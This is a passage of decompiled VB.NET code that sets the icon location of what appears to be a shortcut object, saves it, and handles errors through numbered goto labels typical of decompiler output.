						if (Strings.InStr(Conversions.ToString(obj4), ",", (CompareMethod)0) == 0)
						{
							goto IL_049c;
						}
						goto IL_04d1;
						IL_049c:
						num = 52;
						Interaction.MsgBox((object)text, (MsgBoxStyle)0, (object)null);
						goto IL_04aa;
						IL_04aa:
						num = 53;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "IconLocation", new object[1] { text }, (string[])null, (Type[])null, false, true);
						goto IL_0526;
						IL_04d1:
						num = 55;
						goto IL_04d5;
						IL_04d5:
						num = 56;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "IconLocation", new object[1] { RuntimeHelpers.GetObjectValue(obj4) }, (string[])null, (Type[])null, false, true);
						goto IL_0526;
						IL_0526:
						num = 58;
						NewLateBinding.LateCall(obj3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_0501;
						IL_0501:
						num = 59;
						obj4 = null;
						goto IL_0508;
						IL_0508:
						obj3 = null;
						goto IL_050b;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0001_dispatch = 1683;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
